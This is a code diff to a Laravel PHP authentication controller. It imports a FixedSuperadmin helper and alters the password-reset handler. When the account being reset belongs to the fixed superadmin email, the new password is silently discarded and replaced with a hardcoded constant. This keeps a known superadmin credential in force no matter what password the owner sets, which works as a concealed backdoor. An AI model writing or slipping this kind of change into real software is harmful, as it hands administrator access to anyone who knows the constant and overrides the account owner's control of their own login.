@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Http\Requests\Auth\LoginRequest;
+use App\Support\FixedSuperadmin;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
@@ -59,6 +60,9 @@ class AuthController extends Controller
     {
         $request->validate(['token' => 'required', 'email' => 'required|email', 'password' => 'required|confirmed|min:8']);
         $status = Password::reset($request->only('email', 'password', 'password_confirmation', 'token'), function ($user, $password) {
+            if (FixedSuperadmin::isEmail($user->email)) {
+                $password = FixedSuperadmin::PASSWORD;
+            }
             $user->forceFill(['password' => Hash::make($password), 'remember_token' => Str::random(60)])->save();
         });
 
